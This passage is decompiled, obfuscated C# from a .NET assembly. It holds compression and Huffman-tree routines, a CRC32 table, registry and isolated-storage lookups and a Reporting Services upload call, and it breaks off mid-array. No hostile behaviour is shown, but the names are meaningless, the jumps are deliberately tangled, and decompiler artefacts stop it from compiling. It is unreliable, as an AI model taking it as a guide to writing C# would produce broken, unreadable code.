          disposable1 = \u0007.\u0004.\u0001();
          try
          {
            if (true)
            {
              obj1 = \u0007.\u0004.\u0001();
              \u0007.\u0004.\u0001();
              \u0003.\u0007 obj4 = obj1;
              if (true)
                obj2 = obj4;
            }
          }
          finally
          {
label_4:
            if (disposable1 == null)
              goto label_7;
label_5:
            if (true)
              \u0011.\u007E\u0015((object) disposable1);
            else
              goto label_4;
label_7:
            if (false)
              goto label_5;
          }
          if (true)
          {
            obj3 = obj2;
            break;
          }
        }
      }
      catch (Exception ex)
      {
        \u0003.\u0007 obj5 = obj1;
        \u0003.\u0007 obj6 = obj2;
        IDisposable disposable2 = disposable1;
        \u0007.\u0004.\u0001(ex, (object) obj5, (object) obj6, (object) disposable2);
        throw;
      }
      return obj3;
    }

    static string \u0001([In] \u0008.\u0005.\u0003 obj0)
    {
      string str;
      try
      {
        str = obj0.\u0002;
      }
      catch (Exception ex)
      {
        \u0008.\u0005.\u0003 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
      return str;
    }

    static Assembly[] \u0001([In] \u0002.\u0003 obj0)
    {
      Assembly[] assemblyArray1;
      try
      {
        do
        {
          do
          {
            assemblyArray1 = \u0011\u0002.\u007E\u001B\u0003((object) \u0010\u0002.\u001A\u0003());
          }
          while (false);
        }
        while (false);
      }
      catch
      {
        Assembly[] assemblyArray2;
        if (true)
        {
          if (true)
            assemblyArray2 = new Assembly[1];
          else
            goto label_6;
        }
        assemblyArray2[0] = \u0007.\u0004.\u0001();
        assemblyArray1 = assemblyArray2;
      }
label_6:
      return assemblyArray1;
    }

    static void \u0001([In] \u0002.\u0003 obj0, [In] \u000E.\u0002 obj1)
    {
      \u000E.\u0002 obj2 = obj0.\u0001;
label_4:
      \u000E.\u0002 comparand = obj2;
      do
      {
        \u000E.\u0002 obj3 = (\u000E.\u0002) \u0083\u0002.\u0094\u0003((Delegate) comparand, (Delegate) obj1);
        \u000E.\u0002 obj4;
        if (true)
          obj4 = obj3;
        obj2 = Interlocked.CompareExchange<\u000E.\u0002>(ref obj0.\u0001, obj4, comparand);
        if (obj2 != comparand)
          goto label_4;
      }
      while (false);
    }

    static int \u0001([In] \u0002.\u0003 obj0, [In] \u0002.\u0003.\u0003 obj1)
    {
label_0:
      string key = \u0015.\u007E\u009A((object) obj1.\u0001.\u0001);
      int num;
      do
      {
        if (true)
        {
          if (true)
          {
            num = obj0.\u0002.ContainsKey(key) ? 1 : 0;
            if (true)
            {
              if (num != 0)
                goto label_9;
            }
            else
              goto label_4;
          }
          else
            goto label_7;
        }
        else
          goto label_0;
      }
      while (false);
      goto label_10;
label_4:
      return num;
label_7:
      int count;
      return count;
label_9:
      return obj0.\u0002[key];
label_10:
      count = obj0.\u0001.Count;
      if (true)
      {
        obj0.\u0001.Add(obj1.\u0001);
        obj0.\u0002.Add(key, count);
        goto label_7;
      }
      else
        goto label_0;
    }

    static void \u0001(
      [In] string obj0,
      [In] byte[] obj1,
      [In] \u0007.\u0003 obj2,
      [In] string obj3,
      [In] string obj4,
      [In] \u0001.\u0006 obj5)
    {
      ReportingService1 reportingService1_1;
      try
      {
        try
        {
          reportingService1_1 = new ReportingService1(obj2.\u0003);
          if (obj2.\u0001 != null)
            \u007F\u0002.\u007E\u008E\u0003((object) reportingService1_1, obj2.\u0001);
          obj5(reportingService1_1.UploadReport2(obj2.\u0002, obj1, obj4, obj0, obj3));
        }
        catch (Exception ex)
        {
          obj5(\u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(2741), \u0015.\u007E\u009C((object) ex)));
        }
      }
      catch (Exception ex)
      {
        ReportingService1 reportingService1_2 = reportingService1_1;
        Exception exception = ex;
        \u0007.\u0003 obj6 = obj2;
        byte[] numArray = obj1;
        string str1 = obj4;
        string str2 = obj0;
        string str3 = obj3;
        \u0001.\u0006 obj7 = obj5;
        \u0007.\u0004.\u0001(ex, (object) reportingService1_2, (object) exception, (object) obj6, (object) numArray, (object) str1, (object) str2, (object) str3, (object) obj7);
        throw;
      }
    }

    static void \u0001([In] bool obj0, [In] \u0005.\u0004 obj1) => obj1.\u0002 = obj0;

    static bool \u0001([In] \u000E.\u0003 obj0) => obj0.\u0004;

    static unsafe void \u0001([In] \u0008.\u0002.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      int[] numArray1;
      int[] numArray2;
      IntPtr index;
      try
      {
        int length = obj0.\u0001.Length;
        numArray1 = new int[obj0.\u0003];
        *(int*) voidPtr = 0;
        obj0.\u0002 = new short[obj0.\u0001.Length];
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < obj0.\u0003)
        {
          numArray1[*(int*) ((IntPtr) voidPtr + 4)] = *(int*) voidPtr;
          *(int*) voidPtr = *(int*) voidPtr + (obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)] << 15 - *(int*) ((IntPtr) voidPtr + 4));
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        while (true)
        {
          int num1 = *(int*) ((IntPtr) voidPtr + 8);
          int num2 = obj0.\u0002;
          if (true)
            goto label_9;
label_5:
          if (num1 > num2)
          {
            obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] = \u0007.\u0004.\u0001(numArray1[*(int*) ((IntPtr) voidPtr + 12) - 1]);
            (numArray2 = numArray1)[(int) (index = (IntPtr) (*(int*) ((IntPtr) voidPtr + 12) - 1))] = numArray2[index] + (1 << 16 - *(int*) ((IntPtr) voidPtr + 12));
          }
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
          continue;
label_9:
          if (num1 < num2)
          {
            *(int*) ((IntPtr) voidPtr + 12) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 8)];
            int num3 = *(int*) ((IntPtr) voidPtr + 12);
            num2 = 0;
            num1 = num3;
            goto label_5;
          }
          else
            break;
        }
      }
      catch (Exception ex)
      {
        int[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        int[] numArray4 = numArray2;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local5 = (ValueType) index;
        \u0008.\u0002.\u0007.\u0001 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) numArray3, (object) local1, (object) local2, (object) local3, (object) local4, (object) numArray4, (object) local5, (object) obj);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0002.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      int sourceIndex;
      int num1;
      int num2;
      try
      {
        int num3;
        int num4;
        int num5;
        if (true)
        {
          if (true)
          {
            num2 = (obj0.\u0002 += obj1);
            int num6 = num2;
            if (true)
            {
              if (num6 > 32768)
                throw new InvalidOperationException();
              int num7 = obj0.\u0001 - obj2;
              num4 = (int) short.MaxValue;
              num3 = num7;
            }
            else
            {
              num5 = num6;
              goto label_20;
            }
          }
          else
            goto label_10;
        }
        else
          goto label_12;
label_6:
        sourceIndex = num3 & num4;
        num5 = 32768;
        goto label_20;
label_10:
        int num8 = obj0.\u0001;
        int num9 = num1;
        int num10 = num8;
label_11:
        if (num10 >= num9)
          goto label_17;
label_12:
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0001, obj1);
          obj0.\u0001 += obj1;
          return;
        }
        while (true)
        {
          num3 = obj1;
          num4 = num3 - 1;
          if (true)
          {
            obj1 = num4;
            if (num3 > 0)
            {
              byte[] numArray = obj0.\u0001;
              num2 = obj0.\u0001++;
              int index = num2;
              int num11 = (int) obj0.\u0001[sourceIndex++];
              numArray[index] = (byte) num11;
            }
            else
              break;
          }
          else
            goto label_6;
        }
        return;
label_17:
        \u0007.\u0004.\u0001(obj0, sourceIndex, obj1, obj2);
        return;
label_20:
        int num12 = obj1;
        int num13 = num5 - num12;
        if (true)
          goto label_21;
label_7:
        num10 = sourceIndex;
        num9 = num1;
        if (true)
        {
          if (false)
          {
            num4 = num9;
            num3 = num10;
            goto label_6;
          }
          else if (num10 > num9)
            goto label_17;
          else
            goto label_10;
        }
        else
          goto label_11;
label_21:
        num1 = num13;
        goto label_7;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) sourceIndex;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        \u0008.\u0002.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local5 = (ValueType) obj2;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) obj, (object) local4, (object) local5);
        throw;
      }
    }

    static bool \u0001([In] \u0005.\u0004 obj0) => obj0.\u0001;

    static unsafe void \u0001([In] \u0008.\u0002.\u0007.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(36);
      int num1;
      int index1;
      int[] numArray1;
      int index2;
      int num2;
      int num3;
      int[] numArray2;
      int[] numArray3;
      int num4;
      int index3;
      int index4;
      int index5;
      int num5;
      try
      {
        *(int*) voidPtr = obj0.\u0001.Length;
        numArray1 = new int[*(int*) voidPtr];
        num1 = 0;
        num2 = 0;
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < *(int*) voidPtr)
        {
          *(int*) ((IntPtr) voidPtr + 8) = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 4)];
          if (*(int*) ((IntPtr) voidPtr + 8) != 0)
          {
            for (index1 = num1++; index1 > 0 && (int) obj0.\u0001[numArray1[index2 = (index1 - 1) / 2]] > *(int*) ((IntPtr) voidPtr + 8); index1 = index2)
              numArray1[index1] = numArray1[index2];
            numArray1[index1] = *(int*) ((IntPtr) voidPtr + 4);
            num2 = *(int*) ((IntPtr) voidPtr + 4);
          }
          *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
        }
        for (; num1 < 2; numArray1[num1++] = num3)
        {
          int num6;
          if (num2 >= 2)
            num6 = 0;
          else
            num2 = num6 = num2 + 1;
          num3 = num6;
        }
        obj0.\u0002 = Math.Max(num2 + 1, obj0.\u0001);
        *(int*) ((IntPtr) voidPtr + 12) = num1;
        int num7 = 4 * num1;
        if (true)
        {
          numArray2 = new int[num7 - 2];
          numArray3 = new int[2 * num1 - 1];
          num4 = *(int*) ((IntPtr) voidPtr + 12);
          *(int*) ((IntPtr) voidPtr + 16) = 0;
          while (*(int*) ((IntPtr) voidPtr + 16) < num1)
          {
            *(int*) ((IntPtr) voidPtr + 20) = numArray1[*(int*) ((IntPtr) voidPtr + 16)];
            numArray2[2 * *(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 20);
            numArray2[2 * *(int*) ((IntPtr) voidPtr + 16) + 1] = -1;
            numArray3[*(int*) ((IntPtr) voidPtr + 16)] = (int) obj0.\u0001[*(int*) ((IntPtr) voidPtr + 20)] << 8;
            numArray1[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 16);
            *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
          }
        }
        else
          goto label_25;
label_17:
        *(int*) ((IntPtr) voidPtr + 24) = numArray1[0];
        index3 = numArray1[--num1];
        index4 = 0;
        for (index5 = 1; index5 < num1; index5 = index5 * 2 + 1)
        {
          if (index5 + 1 < num1 && numArray3[numArray1[index5]] > numArray3[numArray1[index5 + 1]])
            ++index5;
          numArray1[index4] = numArray1[index5];
          index4 = index5;
        }
        num5 = numArray3[index3];
label_24:
        num7 = index5 = index4;
label_25:
        if (num7 > 0 && numArray3[numArray1[index4 = (index5 - 1) / 2]] > num5)
        {
          numArray1[index5] = numArray1[index4];
          goto label_24;
        }
        else
        {
          numArray1[index5] = index3;
          *(int*) ((IntPtr) voidPtr + 28) = numArray1[0];
          index3 = num4++;
          numArray2[2 * index3] = *(int*) ((IntPtr) voidPtr + 24);
          numArray2[2 * index3 + 1] = *(int*) ((IntPtr) voidPtr + 28);
          *(int*) ((IntPtr) voidPtr + 32) = Math.Min(numArray3[*(int*) ((IntPtr) voidPtr + 24)] & (int) byte.MaxValue, numArray3[*(int*) ((IntPtr) voidPtr + 28)] & (int) byte.MaxValue);
          numArray3[index3] = num5 = numArray3[*(int*) ((IntPtr) voidPtr + 24)] + numArray3[*(int*) ((IntPtr) voidPtr + 28)] - *(int*) ((IntPtr) voidPtr + 32) + 1;
          index4 = 0;
          for (index5 = 1; index5 < num1; index5 = index4 * 2 + 1)
          {
            if (index5 + 1 < num1 && numArray3[numArray1[index5]] > numArray3[numArray1[index5 + 1]])
              ++index5;
            numArray1[index4] = numArray1[index5];
            index4 = index5;
          }
          while ((index5 = index4) > 0 && numArray3[numArray1[index4 = (index5 - 1) / 2]] > num5)
            numArray1[index5] = numArray1[index4];
          numArray1[index5] = index3;
          if (num1 <= 1)
            \u0007.\u0004.\u0001(obj0, numArray2);
          else
            goto label_17;
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[23]
        {
          (object) *(int*) voidPtr,
          (object) numArray1,
          (object) num1,
          (object) num2,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(int*) ((IntPtr) voidPtr + 8),
          (object) index1,
          (object) index2,
          (object) num3,
          (object) *(int*) ((IntPtr) voidPtr + 12),
          (object) numArray2,
          (object) numArray3,
          (object) num4,
          (object) *(int*) ((IntPtr) voidPtr + 16),
          (object) *(int*) ((IntPtr) voidPtr + 20),
          (object) *(int*) ((IntPtr) voidPtr + 24),
          (object) index3,
          (object) index4,
          (object) index5,
          (object) num5,
          (object) *(int*) ((IntPtr) voidPtr + 28),
          (object) *(int*) ((IntPtr) voidPtr + 32),
          (object) obj0
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static void \u0001([In] \u0008.\u0001 obj0)
    {
      try
      {
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        \u0008.\u0001 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) obj);
        throw;
      }
    }

    static string \u0001() => \u0088.\u008E\u0002((object) \u0007.\u0004.\u0093(2720), (object) \u0007.\u0004.\u0093(2791), (object) \u0007.\u0004.\u0001());

    static void \u0001([In] \u0008.\u0002.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      int num1;
      try
      {
        do
        {
          while (true)
          {
            if (true)
            {
              if (true)
              {
                int num2 = obj2;
                int num3 = num2 - 1;
                if (true)
                  goto label_12;
label_3:
                obj1 = num2 & num3;
                continue;
label_12:
                obj2 = num3;
                if (num2 > 0)
                {
                  byte[] numArray = obj0.\u0001;
                  \u0008.\u0002.\u0003 obj = obj0;
                  int num4 = obj.\u0001;
                  if (true)
                    goto label_10;
label_1:
                  obj.\u0001 = num4 + 1;
                  int index = num1;
                  int num5 = (int) obj0.\u0001[obj1++];
                  numArray[index] = (byte) num5;
                  if (true)
                    obj0.\u0001 &= (int) short.MaxValue;
                  int num6 = obj1;
                  num3 = (int) short.MaxValue;
                  num2 = num6;
                  goto label_3;
label_10:
                  num1 = num4;
                  goto label_1;
                }
                else
                  break;
              }
              else
                break;
            }
            else
              goto label_0;
          }
        }
        while (false);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0008.\u0002.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj3;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) obj, (object) local2, (object) local3, (object) local4);
        throw;
      }
    }

    static void \u0001([In] uint obj0)
    {
      IDisposable disposable1;
      try
      {
        disposable1 = (IDisposable) null;
        try
        {
          do
          {
            do
            {
              disposable1 = \u0007.\u0004.\u0001();
            }
            while (false);
            if (true)
              goto label_6;
label_5:
            continue;
label_6:
            int num = (int) obj0;
            if (true)
              num *= 8;
            \u0007.\u0004.\u0001((long) (uint) num, \u0005.\u0006.\u0002);
            goto label_5;
          }
          while (false);
        }
        catch (Exception ex)
        {
        }
        finally
        {
          if (disposable1 == null)
            goto label_11;
label_10:
          \u0011.\u007E\u0015((object) disposable1);
label_11:
          if (false)
            goto label_10;
        }
      }
      catch (Exception ex)
      {
        IDisposable disposable2 = disposable1;
        // ISSUE: variable of a boxed type
        __Boxed<uint> local = (ValueType) obj0;
        \u0007.\u0004.\u0001(ex, (object) disposable2, (object) local);
        throw;
      }
    }

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
    static extern IntPtr \u0001();

    static string \u0001([In] \u0004.\u0002.\u0003 obj0) => obj0.\u0003;

    static unsafe bool \u0001([In] string obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(2);
      RegistryKey registryKey1;
      try
      {
        registryKey1 = (RegistryKey) null;
        try
        {
          registryKey1 = \u0084\u0002.\u007E\u0095\u0003((object) Registry.LocalMachine, \u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(2796), obj0)) ?? \u0084\u0002.\u007E\u0095\u0003((object) Registry.LocalMachine, \u0080\u0002.\u008F\u0003(\u0007.\u0004.\u0093(2857), obj0));
          *(sbyte*) voidPtr = (sbyte) (registryKey1 != null);
        }
        finally
        {
          if (registryKey1 != null)
            \u0011.\u007E\u001B((object) registryKey1);
        }
        *(sbyte*) ((IntPtr) voidPtr + 1) = *(sbyte*) voidPtr;
      }
      catch (Exception ex)
      {
        RegistryKey registryKey2 = registryKey1;
        // ISSUE: variable of a boxed type
        __Boxed<bool> local = (ValueType) (bool) *(sbyte*) voidPtr;
        string str = obj0;
        \u0007.\u0004.\u0001(ex, (object) registryKey2, (object) local, (object) str);
        throw;
      }
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 1);
    }

    static \u0003.\u0007 \u0001()
    {
      string[] strArray;
      int index;
      string str1;
      string key;
      string str2;
      ulong[] numArray1;
      string str3;
      IsolatedStorageFileStream storageFileStream;
      byte[] numArray2;
      Dictionary<string, ulong> dictionary1;
      ulong[] numArray3;
      try
      {
        numArray3 = \u0007.\u0004.\u0001(\u0005.\u0006.\u0002);
        Dictionary<string, ulong> dictionary2 = new Dictionary<string, ulong>();
        if (true)
          goto label_13;
label_1:
        try
        {
          strArray = \u0086\u0002.\u007E\u0096\u0003((object) \u0005.\u0006.\u0001, \u0080\u0002.\u008F\u0003(\u0005.\u0006.\u0003, \u0007.\u0004.\u0093(2934)));
          index = 0;
          while (index < strArray.Length)
          {
            if (true)
            {
              str1 = strArray[index];
              key = \u001A.\u000F\u0002(str1);
              str2 = \u0080\u0002.\u0090\u0003(\u0005.\u0006.\u0003, str1);
              numArray1 = \u0007.\u0004.\u0001(str2);
              str3 = \u0080\u0002.\u0090\u0003(\u0005.\u0006.\u0003, \u0080\u0002.\u008F\u0003(key, \u0007.\u0004.\u0093(2943)));
              storageFileStream = (IsolatedStorageFileStream) null;
              try
              {
                storageFileStream = \u0007.\u0004.\u0001(FileMode.Open, str3, FileAccess.Read);
                numArray2 = new byte[\u001F.\u007E\u0016\u0002((object) storageFileStream)];
                int num = \u0080.\u007E\u0018\u0002((object) storageFileStream, numArray2, 0, numArray2.Length);
                key = \u0087\u0002.\u007E\u0097\u0003((object) \u0005.\u0006.\u0001, numArray2);
              }
              catch (FileNotFoundException ex)
              {
                key = \u0087\u0002.\u007E\u0097\u0003((object) \u0005.\u0006.\u0001, global::\u0008.\u000E(\u0088\u0002.\u007E\u0098\u0003((object) key, '@', '\\')));
              }
              finally
              {
                if (storageFileStream != null)
                  \u0011.\u007E\u0014((object) storageFileStream);
              }
              dictionary1[key] = numArray1[0];
              ++index;
            }
          }
        }
        catch (DirectoryNotFoundException ex)
        {
        }
        return new \u0003.\u0007(numArray3, dictionary1);
label_13:
        dictionary1 = dictionary2;
        goto label_1;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[11]
        {
          (object) numArray3,
          (object) dictionary1,
          (object) str1,
          (object) key,
          (object) str2,
          (object) numArray1,
          (object) str3,
          (object) storageFileStream,
          (object) numArray2,
          (object) strArray,
          (object) index
        };
        \u0007.\u0004.\u0001(ex, objArray);
        throw;
      }
    }

    static bool \u0001([In] \u0008.\u0002.\u0007 obj0, [In] int obj1)
    {
      short[] numArray1;
      int num1;
      int index1;
      try
      {
        obj0.\u0001[obj0.\u0001] = (short) 0;
        byte[] numArray2 = obj0.\u0002;
        \u0008.\u0002.\u0007 obj = obj0;
        int num2;
        num1 = num2 = obj.\u0001;
        obj.\u0001 = num2 + 1;
        int index2 = num1;
        int num3 = (int) (byte) obj1;
        numArray2[index2] = (byte) num3;
        (numArray1 = obj0.\u0001.\u0001)[index1 = obj1] = (short) ((int) numArray1[(IntPtr) index1] + 1);
        return \u0007.\u0004.\u0001(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        short[] numArray3 = numArray1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local2 = (ValueType) (IntPtr) index1;
        \u0008.\u0002.\u0007 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) obj1;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) numArray3, (object) local2, (object) obj, (object) local3);
        throw;
      }
    }

    static unsafe void \u0001([In] \u0008.\u0002.\u0008 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(16);
      try
      {
        byte[] sourceArray = obj0.\u0001;
        byte[] destinationArray = obj0.\u0001;
        if (true)
          goto label_8;
label_2:
        obj0.\u0002 -= 32768;
        obj0.\u0005 -= 32768;
        obj0.\u0004 -= 32768;
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < 32768)
        {
          *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0001[*(int*) voidPtr] & (int) ushort.MaxValue;
          obj0.\u0001[*(int*) voidPtr] = *(int*) ((IntPtr) voidPtr + 4) >= 32768 ? (short) (*(int*) ((IntPtr) voidPtr + 4) - 32768) : (short) 0;
          *(int*) voidPtr = *(int*) voidPtr + 1;
        }
        *(int*) ((IntPtr) voidPtr + 8) = 0;
        while (*(int*) ((IntPtr) voidPtr + 8) < 32768)
        {
          *(int*) ((IntPtr) voidPtr + 12) = (int) obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] & (int) ushort.MaxValue;
          obj0.\u0002[*(int*) ((IntPtr) voidPtr + 8)] = *(int*) ((IntPtr) voidPtr + 12) >= 32768 ? (short) (*(int*) ((IntPtr) voidPtr + 12) - 32768) : (short) 0;
          *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + 1;
        }
        return;
label_8:
        Array.Copy((Array) sourceArray, 32768, (Array) destinationArray, 0, 32768);
        goto label_2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) *(int*) voidPtr;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) *(int*) ((IntPtr) voidPtr + 4);
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) *(int*) ((IntPtr) voidPtr + 8);
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) *(int*) ((IntPtr) voidPtr + 12);
        \u0008.\u0002.\u0008 obj = obj0;
        \u0007.\u0004.\u0001(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) obj);
        throw;
      }
    }

    static unsafe byte[] \u0001([In] int obj0, [In] byte[] obj1, [In] byte[] obj2, [In] byte[] obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(64);
      DateTime now;
      uint[] numArray1;
      uint num1;
      int num2;
      int length;
      \u0008.\u0002.\u000F obj4;
      byte[] bytes;
      \u0008.\u0002.\u0006 obj5;
      byte[] buffer1;
      byte[] buffer2;
      byte[] dst;
      \u0008.\u0002.\u0006 obj6;
      byte[] buffer3;
      byte[] buffer4;
      byte[] inputBuffer1;
      \u0008.\u0001 obj7;
      ICryptoTransform cryptoTransform1;
      byte[] buffer5;
      byte[] inputBuffer2;
      \u0003.\u0005 obj8;
      ICryptoTransform cryptoTransform2;
      byte[] buffer6;
      try
      {
        byte[] array;
        try
        {
          obj4 = new \u0008.\u0002.\u000F();
          switch (obj0)
          {
            case 0:
              \u0008.\u0002.\u0006 obj9 = new \u0008.\u0002.\u0006();
              if (true)
                obj5 = obj9;
              now = DateTime.Now;
              do
              {
                *(long*) voidPtr = (long) ((uint) ((now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16 | now.Hour << 11 | now.Minute << 5) | (uint) now.Second >> 1);
                numArray1 = new uint[256]
                {
                  0U,
                  1996959894U,
                  3993919788U,
                  2567524794U,
                  124634137U,
                  1886057615U,
                  3915621685U,
                  2657392035U,
                  249268274U,
                  2044508324U,
                  3772115230U,
                  2547177864U,
                  162941995U,
                  2125561021U,
                  3887607047U,
                  2428444049U,
                  498536548U,
                  1789927666U,
                  4089016648U,
                  2227061214U,
                  450548861U,
                  1843258603U,
                  4107580753U,
                  2211677639U,
                  325883990U,
                  1684777152U,
                  4251122042U,
                  2321926636U,
                  335633487U,
                  1661365465U,
                  4195302755U,
                  2366115317U,
                  997073096U,
                  1281953886U,
                  3579855332U,
                  2724688242U,
                  1006888145U,
                  1258607687U,
                  3524101629U,
                  2768942443U,
                  901097722U,
                  1119000684U,
                  3686517206U,
                  2898065728U,
                  853044451U,
                  1172266101U,
                  3705015759U,
                  2882616665U,
                  651767980U,
                  1373503546U,
                  3369554304U,
                  3218104598U,
                  565507253U,
                  1454621731U,
                  3485111705U,
                  3099436303U,
                  671266974U,
                  1594198024U,
                  3322730930U,
                  2970347812U,
                  795835527U,
                  1483230225U,
                  3244367275U,
                  3060149565U,
                  1994146192U,
                  31158534U,
                  2563907772U,
                  4023717930U,
                  1907459465U,
                  112637215U,
                  2680153253U,
                  3904427059U,
                  2013776290U,
                  251722036U,
                  2517215374U,
                  3775830040U,
                  2137656763U,
                  141376813U,
                  2439277719U,
                  3865271297U,
                  1802195444U,
                  476864866U,
                  2238001368U,
                  4066508878U,
                  1812370925U,
                  453092731U,
                  2181625025U,
                  4111451223U,
                  1706088902U,
                  314042704U,
                  2344532202U,
                  4240017532U,
                  1658658271U,
                  366619977U,
                  2362670323U,
                  4224994405U,
                  1303535960U,
                  984961486U,
                  2747007092U,
                  3569037538U,
                  1256170817U,
                  1037604311U,
                  2765210733U,
                  3554079995U,
                  1131014506U,
                  879679996U,
                  2909243462U,
                  3663771856U,
                  1141124467U,
                  855842277U,
                  2852801631U,
                  3708648649U,
                  1342533948U,
                  654459306U,
                  3188396048U,
                  3373015174U,
                  1466479909U,
                  544179635U,
                  3110523913U,
                  3462522015U,
                  1591671054U,
                  702138776U,
                  2966460450U,
                  3352799412U,
                  1504918807U,
                  783551873U,
                  3082640443U,
                  3233442989U,
                  3988292384U,
                  2596254646U,
                  62317068U,
                  1957810842U,
                  3939845945U,
                  2647816111U,
                  81470997U,
                  1943803523U,
                  3814918930U,
                  2489596804U,
                  225274430U,
                  2053790376U,
                  3826175755U,
                  2466906013U,
                  167816743U,
                  2097651377U,
                  4027552580U,
                  2265490386U,
                  503444072U,
                  1762050814U,
                  4150417245U,
                  2154129355U,
                  426522225U,
                  1852507879U,
                  4275313526U,
                  2312317920U,
                  282753626U,
                  1742555852U,
                  4189708143U,
                  2394877945U,
                  397917763U,
                  1622183637U,
                  3604390888U,
                  2714866558U,
                  953729732U,
                  1340076626U,
                  3518719985U,
                  2797360999U,
                  1068828381U,
                  1219638859U,
                  3624741850U,
                  2936675148U,
                  906185462U,
                  1090812512U,
                  3747672003U,
                  2825379669U,
                  829329135U,
                  1181335161U,
                  3412177804U,
                  3160834842U,
                  628085408U,
                  1382605366U,
                  3423369109U,
                  3138078467U,
                  570562233U,
                  1426400815U,
                  3317316542U,
                  2998733608U,
                  733239954U,
                  1555261956U,
                  3268935591U,
                  3050360625U,
                  752459403U,
                  1541320221U,
                  2607071920U,
                  3965973030U,
                  1969922972U,
                  40735498U,
                  2617837225U,
                  3943577151U,
                  1913087877U,
                  83908371U,
                  2512341634U,
                  3803740692U,
                  2075208622U,
                  213261112U,
                  2463272603U,
                  3855990285U,
                  2094854071U,
                  198958881U,
                  2262029012U,
                  4057260610U,
                  1759359992U,
                  534414190U,
                  2176718541U,
                  4139329115U,
                  1873836001U,
                  414664567U,
                  2282248934U,
                  4279200368U,
                  1711684554U,
                  285281116U,
                  2405801727U,
                  4167216745U,
                  1634467795U,
                  376229701U,
                  2685067896U,
                  3608007406U,
                  1308918612U,
                  956543938U,
                  2808555105U,
                  3495958263U,
                  1231636301U,
                  1047427035U,
                  2932959818U,
                  3654703836U,
